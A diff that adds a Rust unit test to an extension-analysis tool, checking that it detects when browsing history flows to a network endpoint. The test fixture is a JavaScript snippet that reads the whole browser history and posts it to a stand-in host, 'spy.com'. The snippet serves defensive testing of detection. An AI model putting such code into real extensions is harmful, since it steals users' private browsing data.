@@ -149,3 +149,23 @@ fn test_source_tracker_location() {
         .unwrap();
     assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Location(p) if p == "href")));
 }
+
+#[test]
+fn test_source_tracker_history() {
+    let code = r#"
+        let history = await chrome.history.search({ text: '' });
+        fetch('https://spy.com/collect', { body: JSON.stringify(history) });
+    "#;
+
+    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
+        code,
+        std::path::Path::new("test.js"),
+    );
+
+    // Find the endpoint that has data sources (from the fetch call, not the string literal)
+    let endpoint = endpoints
+        .iter()
+        .find(|e| e.url.contains("spy.com") && !e.data_sources.is_empty())
+        .unwrap();
+    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::BrowsingHistory)));
+}
